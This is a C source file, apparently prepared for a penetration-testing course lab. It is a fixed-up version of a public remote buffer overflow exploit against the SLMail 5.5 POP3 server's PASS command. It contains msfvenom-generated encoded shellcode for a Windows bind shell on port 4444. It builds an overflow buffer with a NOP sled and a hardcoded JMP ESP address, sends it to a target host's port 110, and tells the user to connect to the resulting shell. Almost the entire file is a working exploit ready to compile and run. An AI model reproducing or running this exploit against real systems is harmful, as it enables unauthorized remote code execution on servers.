/**
 * 646-fixed.c
 *
 * Modified version of the Exploit-DB SLMail 5.5 exploit 646.c
 * credit and copyright remain under the original author(s):
 *
 * SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
 * недействительный 31337 Team
 *
 */

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

/**
 * [*] bind 4444 
 *
 * msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.47 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 *
 */
unsigned char shellcode[] = 
"\xdb\xdd\xd9\x74\x24\xf4\xb8\xa5\xbf\xcc\x78\x5b\x2b\xc9\xb1"
"\x53\x83\xeb\xfc\x31\x43\x13\x03\xe6\xac\x2e\x8d\x14\x3a\x2c"
"\x6e\xe4\xbb\x51\xe6\x01\x8a\x51\x9c\x42\xbd\x61\xd6\x06\x32"
"\x09\xba\xb2\xc1\x7f\x13\xb5\x62\x35\x45\xf8\x73\x66\xb5\x9b"
"\xf7\x75\xea\x7b\xc9\xb5\xff\x7a\x0e\xab\xf2\x2e\xc7\xa7\xa1"
"\xde\x6c\xfd\x79\x55\x3e\x13\xfa\x8a\xf7\x12\x2b\x1d\x83\x4c"
"\xeb\x9c\x40\xe5\xa2\x86\x85\xc0\x7d\x3d\x7d\xbe\x7f\x97\x4f"
"\x3f\xd3\xd6\x7f\xb2\x2d\x1f\x47\x2d\x58\x69\xbb\xd0\x5b\xae"
"\xc1\x0e\xe9\x34\x61\xc4\x49\x90\x93\x09\x0f\x53\x9f\xe6\x5b"
"\x3b\xbc\xf9\x88\x30\xb8\x72\x2f\x96\x48\xc0\x14\x32\x10\x92"
"\x35\x63\xfc\x75\x49\x73\x5f\x29\xef\xf8\x72\x3e\x82\xa3\x1a"
"\xf3\xaf\x5b\xdb\x9b\xb8\x28\xe9\x04\x13\xa6\x41\xcc\xbd\x31"
"\xa5\xe7\x7a\xad\x58\x08\x7b\xe4\x9e\x5c\x2b\x9e\x37\xdd\xa0"
"\x5e\xb7\x08\x5c\x56\x1e\xe3\x43\x9b\xe0\x53\xc4\x33\x89\xb9"
"\xcb\x6c\xa9\xc1\x01\x05\x42\x3c\xaa\x38\xcf\xc9\x4c\x50\xff"
"\x9f\xc7\xcc\x3d\xc4\xdf\x6b\x3d\x2e\x48\x1b\x76\x38\x4f\x24"
"\x87\x6e\xe7\xb2\x0c\x7d\x33\xa3\x12\xa8\x13\xb4\x85\x26\xf2"
"\xf7\x34\x36\xdf\x6f\xd4\xa5\x84\x6f\x93\xd5\x12\x38\xf4\x28"
"\x6b\xac\xe8\x13\xc5\xd2\xf0\xc2\x2e\x56\x2f\x37\xb0\x57\xa2"
"\x03\x96\x47\x7a\x8b\x92\x33\xd2\xda\x4c\xed\x94\xb4\x3e\x47"
"\x4f\x6a\xe9\x0f\x16\x40\x2a\x49\x17\x8d\xdc\xb5\xa6\x78\x99"
"\xca\x07\xed\x2d\xb3\x75\x8d\xd2\x6e\x3e\xad\x30\xba\x4b\x46"
"\xed\x2f\xf6\x0b\x0e\x9a\x35\x32\x8d\x2e\xc6\xc1\x8d\x5b\xc3"
"\x8e\x09\xb0\xb9\x9f\xff\xb6\x6e\x9f\xd5";


/**
 * Two changes to fix pointer compatibility errors.
 *
 * ptr type changed from int* to char*, all pointer
 * arithmetic changed from 4byte increments to 1byte.
 *
 */
void exploit(int sock) {
      FILE *test;
      char *ptr; // change from `int *ptr;` to `char *ptr`
      char userbuf[] = "USER admin\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = evil; // change from `ptr = &evil` to `ptr = evil`
      ptr = ptr + 2606; // 2606 (PWK Win Se7en) 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2606] = 0x5F4A358F; // JMP ESP PWK Win Se7ev 5F4A358F FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}